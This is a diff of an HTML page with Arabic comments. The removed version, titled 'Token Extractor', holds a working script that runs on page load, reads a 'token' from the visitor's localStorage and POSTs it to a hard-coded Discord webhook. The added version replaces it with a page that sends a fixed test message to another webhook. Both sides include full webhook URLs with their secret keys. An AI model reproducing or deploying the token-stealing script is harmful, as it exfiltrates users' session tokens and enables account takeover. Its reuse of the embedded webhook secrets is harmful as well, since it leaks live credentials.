@@ -1,43 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Token Extractor</title>
-    <script>
-        window.onload = function() {
-            // محاولة الحصول على التوكن من Local Storage
-            var token = localStorage.getItem('token');
-            console.log("Token found: ", token); // تسجيل التوكن للتحقق
-
-            if (token) {
-                // عنوان URL الكامل للويب هوك في Discord
-                var webhookURL = 'https://discord.com/api/webhooks/1272364715456204873/eYdiKGqdFFOOrBWsZFRfwyEmgqKVZt2-_JLYY4zO8zXKc6QrA7h3XYflg358YRugdbs6';
-                
-                // إرسال التوكن إلى ويب هوك
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", webhookURL, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-
-                // تنسيق البيانات كـ JSON
-                var payload = JSON.stringify({
-                    content: "Token: " + token
-                });
-
-                xhr.onload = function() {
-                    console.log("Request sent. Status: " + xhr.status); // تسجيل حالة الطلب
-                };
-
-                xhr.onerror = function() {
-                    console.error("Request failed."); // تسجيل الأخطاء
-                };
-
-                xhr.send(payload);
-            } else {
-                console.log("No token found.");
-            }
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Message to Discord</title>
 </head>
 <body>
-    <h1>Page Loaded</h1>
+    <script>
+        // عنوان ويب هوك الخاص بك
+        var webhookURL = 'https://discord.com/api/webhooks/1272403881627877426/sVSisuDnXjdNRgMsZ-TrQJtw4KLl8HZiYXBb3d6KtuuMSuzccwkTfXwWgVo9rB1Vl8NU';
+
+        // البيانات التي تريد إرسالها
+        var message = {
+            content: 'Hello, this is a test message from my website!'
+        };
+
+        // إرسال البيانات إلى ويب هوك
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', webhookURL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(message));
+
+        xhr.onload = function() {
+            if (xhr.status === 204) {
+                console.log('Message sent successfully!');
+            } else {
+                console.log('Failed to send message');
+            }
+        };
+    </script>
 </body>
 </html>
